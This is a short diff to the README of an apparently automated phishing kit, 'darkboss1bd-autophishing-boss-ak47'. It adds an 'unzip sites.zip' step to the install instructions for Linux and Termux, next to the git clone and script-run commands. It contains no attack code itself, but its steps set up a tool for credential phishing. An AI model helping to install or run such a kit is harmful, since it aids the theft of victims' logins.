@@ -30,13 +30,15 @@ The use of the darkboss1bd-autophishing-boss-ak47 & its resources/phishing-pages
       
 - `cd darkboss1bd-autophishing-boss-ak47`
 - `bash darkboss1bd-autophishing-boss-ak47.sh`
+- ` unzip sites.zip`
 
 ### Android Termux App
 
 
 - `apt upgrade`
 - `apt install git`
-
+- ` unzip sites.zip`
+- 
       git clone https://github.com/darkboss1bd/darkboss1bd-autophishing-boss-ak47.git
       
 - `ls`
